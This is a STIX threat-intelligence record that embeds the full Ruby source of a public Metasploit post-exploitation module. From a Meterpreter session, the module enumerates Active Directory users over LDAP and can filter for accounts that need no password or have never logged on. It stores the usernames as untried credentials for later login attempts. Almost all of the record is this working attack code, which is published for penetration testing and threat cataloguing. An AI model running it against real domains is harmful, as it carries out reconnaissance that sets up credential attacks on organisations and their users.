{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bc0d060f-8f65-4f97-bb93-87d7ef8f9729",
    "created": "2024-08-14T16:33:05.021835Z",
    "modified": "2024-08-14T16:33:05.021838Z",
    "name": "Windows Gather Active Directory Users",
    "description": " This module will enumerate user accounts in the default Active Domain (AD) directory and stores them in the database. If GROUP_MEMBER is set to the DN of a group, this will list the members of that group by performing a recursive/nested search (i.e. it will list users who are members of groups that are members of groups that are members of groups (etc) which eventually include the target group DN.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ad_users.rb",
            "external_id": "enum_ad_users.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n  include Msf::Post::Windows::Accounts\n\n  UAC_DISABLED = 0x02\n  USER_FIELDS = [\n    'sAMAccountName',\n    'name',\n    'userPrincipalName',\n    'userAccountControl',\n    'lockoutTime',\n    'mail',\n    'primarygroupid',\n    'description'\n  ].freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Active Directory Users',\n        'Description' => %q{\n          This module will enumerate user accounts in the default Active Domain (AD) directory and stores\n          them in the database. If GROUP_MEMBER is set to the DN of a group, this will list the members of\n          that group by performing a recursive/nested search (i.e. it will list users who are members of\n          groups that are members of groups that are members of groups (etc) which eventually include the\n          target group DN.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ben Campbell',\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_net_resolve_host\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),\n      OptBool.new('EXCLUDE_LOCKED', [true, 'Exclude in search locked accounts..', false]),\n      OptBool.new('EXCLUDE_DISABLED', [true, 'Exclude from search disabled accounts.', false]),\n      OptString.new('ADDITIONAL_FIELDS', [false, 'Additional fields to retrieve, comma separated', nil]),\n      OptString.new('FILTER', [false, 'Customised LDAP filter', nil]),\n      OptString.new('GROUP_MEMBER', [false, 'Recursively list users that are effectve members of the group DN specified.', nil]),\n      OptEnum.new('UAC', [\n        true, 'Filter on User Account Control Setting.', 'ANY',\n        [\n          'ANY',\n          'NO_PASSWORD',\n          'CHANGE_PASSWORD',\n          'NEVER_EXPIRES',\n          'SMARTCARD_REQUIRED',\n          'NEVER_LOGGEDON'\n        ]\n      ])\n    ])\n  end\n\n  def run\n    @user_fields = USER_FIELDS.dup\n\n    if datastore['ADDITIONAL_FIELDS']\n      additional_fields = datastore['ADDITIONAL_FIELDS'].gsub(/\\s+/, '').split(',')\n      @user_fields.push(*additional_fields)\n    end\n\n    max_search = datastore['MAX_SEARCH']\n\n    begin\n      q = query(query_filter, max_search, @user_fields)\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      # Can't bind or in a network w/ limited accounts\n      print_error(e.message)\n      return\n    end\n\n    if q.nil? || q[:results].empty?\n      print_status('No results returned.')\n    else\n      results_table = parse_results(q[:results])\n      print_line results_table.to_s\n\n      if datastore['STORE_LOOT']\n        stored_path = store_loot('ad.users', 'text/plain', session, results_table.to_csv)\n        print_good(\"Results saved to: #{stored_path}\")\n      end\n    end\n  end\n\n  def account_disabled?(uac)\n    (uac & UAC_DISABLED) > 0\n  end\n\n  def account_locked?(lockout_time)\n    lockout_time > 0\n  end\n\n  # Takes the results of LDAP query, parses them into a table\n  # and records and usernames as {Metasploit::Credential::Core}s in\n  # the database.\n  #\n  # @param results [Array<Array<Hash>>] The LDAP query results to parse\n  # @return [Rex::Text::Table] the table containing all the result data\n  def parse_results(results)\n    domain = datastore['DOMAIN'] || get_domain\n    domain_ip = client.net.resolve.resolve_host(domain)[:ip]\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'Domain Users',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => @user_fields\n    )\n\n    results.each do |result|\n      row = []\n\n      result.each do |field|\n        if field.nil?\n          row << ''\n        else\n          row << field[:value]\n        end\n      end\n\n      username = result[@user_fields.index('sAMAccountName')][:value]\n      uac = result[@user_fields.index('userAccountControl')][:value]\n      lockout_time = result[@user_fields.index('lockoutTime')][:value]\n      store_username(username, uac, lockout_time, domain, domain_ip)\n\n      results_table << row\n    end\n    results_table\n  end\n\n  # Builds the LDAP query 'filter' used to find our User Accounts based on\n  # criteria set by user in the Datastore.\n  #\n  # @return [String] the LDAP query string\n  def query_filter\n    inner_filter = '(objectCategory=person)(objectClass=user)'\n    inner_filter << '(!(lockoutTime>=1))' if datastore['EXCLUDE_LOCKED']\n    inner_filter << '(!(userAccountControl:1.2.840.113556.1.4.803:=2))' if datastore['EXCLUDE_DISABLED']\n    inner_filter << \"(memberof:1.2.840.113556.1.4.1941:=#{datastore['GROUP_MEMBER']})\" if datastore['GROUP_MEMBER']\n    inner_filter << \"(#{datastore['FILTER']})\" unless datastore['FILTER'].blank?\n    case datastore['UAC']\n    when 'ANY'\n    when 'NO_PASSWORD'\n      inner_filter << '(userAccountControl:1.2.840.113556.1.4.803:=32)'\n    when 'CHANGE_PASSWORD'\n      inner_filter << '(!sAMAccountType=805306370)(pwdlastset=0)'\n    when 'NEVER_EXPIRES'\n      inner_filter << '(userAccountControl:1.2.840.113556.1.4.803:=65536)'\n    when 'SMARTCARD_REQUIRED'\n      inner_filter << '(userAccountControl:1.2.840.113556.1.4.803:=262144)'\n    when 'NEVER_LOGGEDON'\n      inner_filter << '(|(lastlogon=0)(!lastlogon=*))'\n    end\n    \"(&#{inner_filter})\"\n  end\n\n  def store_username(username, uac, lockout_time, realm, domain_ip)\n    service_data = {\n      address: domain_ip,\n      port: 445,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      username: username,\n      realm_value: realm,\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN\n    }\n\n    credential_data.merge!(service_data)\n\n    # Create the Metasploit::Credential::Core object\n    credential_core = create_credential(credential_data)\n\n    if account_disabled?(uac.to_i)\n      status = Metasploit::Model::Login::Status::DISABLED\n    elsif account_locked?(lockout_time.to_i)\n      status = Metasploit::Model::Login::Status::LOCKED_OUT\n    else\n      status = Metasploit::Model::Login::Status::UNTRIED\n    end\n\n    # Assemble the options hash for creating the Metasploit::Credential::Login object\n    login_data = {\n      core: credential_core,\n      status: status\n    }\n\n    login_data[:last_attempted_at] = DateTime.now unless (status == Metasploit::Model::Login::Status::UNTRIED)\n\n    # Merge in the service data and create our Login\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}